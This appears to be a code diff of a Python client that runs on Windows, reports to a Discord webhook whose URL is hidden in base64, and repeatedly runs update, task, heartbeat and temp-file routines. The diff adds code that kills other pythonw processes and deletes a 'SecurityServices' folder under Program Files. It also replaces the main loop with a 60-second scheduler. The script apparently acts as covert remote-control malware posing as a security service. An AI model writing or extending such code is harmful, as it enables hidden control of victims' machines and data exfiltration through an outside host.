@@ -1,7 +1,7 @@
 import string, base64, json, re
 import os, socket, sys, importlib, tempfile, random, csv, io, shutil
 import urllib.request, subprocess
-from time import sleep, time
+import time
 from pathlib import Path
 
 def ensure_package(package_name, import_name):
@@ -32,7 +32,7 @@ try:
     import requests
     import psutil
 except:
-    exit()
+    sys.exit()
 
 WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NzAwNjk4NTAzMDI3MTA3Ni9xdUVRY0VxcEFGN3c2TUg4REduSlRtaTBuSUtFVGl2WXpMbEpVNlNSLUpsSWxGYmNLaUtFNDVlczZ1ZGxmOGVFQklBZw=="
 
@@ -146,7 +146,6 @@ def kill_other_pythonw():
         try:
             if proc.info['name'] and 'pythonw' in proc.info['name'].lower():
                 if proc.info['pid'] != current_pid:
-                    print(f"Killing PID {proc.info['pid']}")
                     proc.kill()
         except (psutil.NoSuchProcess, psutil.AccessDenied):
             pass
@@ -354,7 +353,7 @@ def is_new_installed():
 def cleanup_named_tempfiles():
     AGE_THRESHOLD = 60 
     temp_dir = tempfile.gettempdir()
-    now = time()
+    now = time.time()
 
     pattern = re.compile(r'^tmp[^.]{8}\.[^.]{3}$')
     for filename in os.listdir(temp_dir):
@@ -426,15 +425,19 @@ def manage_updates():
                     pass
 
         try:
+            kill_other_pythonw()
+        except:
+            pass
+
+        time.sleep(1)
+        try:
             dir = (Path(os.environ["ProgramFiles"]) / "SecurityServices").resolve()    
             shutil.rmtree(dir)
         except:
             pass
 
-        try:
-            kill_process("pythonw.exe")
-        except:
-            pass
+        if not is_old_installed():
+            send_webhook("Sucessfully removed old install")
 
 def heartbeat():
     global FIRST_MESSAGE
@@ -465,16 +468,62 @@ if __name__ == "__main__":
     if EXPERIMENTAL :
         send_webhook("Experimental client started")
     
-    while True:
-        try:
-            manage_updates()
+    # while True:
+    #     try:
+    #         manage_updates()
 
-            cleanup_named_tempfiles()
+    #         cleanup_named_tempfiles()
 
-            manage_user_tasks()
+    #         manage_user_tasks()
 
-            heartbeat()        
-        except:
-            pass
+    #         heartbeat()        
+    #     except:
+    #         pass
         
-        sleep(60)
+    #     sleep(60)
+
+
+    loop_function_list = [
+        {
+            "func": manage_updates,
+            "args": [],
+            "interval": 60,  # seconds
+            "next_run": time.monotonic(),
+        },
+                {
+            "func": cleanup_named_tempfiles,
+            "args": [],
+            "interval": 60,  # seconds
+            "next_run": time.monotonic(),
+        },
+                {
+            "func": manage_user_tasks,
+            "args": [],
+            "interval": 60,  # seconds
+            "next_run": time.monotonic(),
+        },
+                {
+            "func": heartbeat,
+            "args": [],
+            "interval": 60,  # seconds
+            "next_run": time.monotonic(),
+        }
+    ]
+
+    while True:
+        now = time.monotonic()
+        nearest_next_run = None
+
+        for task in loop_function_list:
+            if now >= task["next_run"]:
+                task["next_run"] += task["interval"]
+                try:
+                    task["func"](*task["args"])
+                except Exception:
+                    pass
+
+            if nearest_next_run is None or task["next_run"] < nearest_next_run:
+                nearest_next_run = task["next_run"]
+
+        sleep_time = max(0, nearest_next_run - time.monotonic())
+        time.sleep(sleep_time)
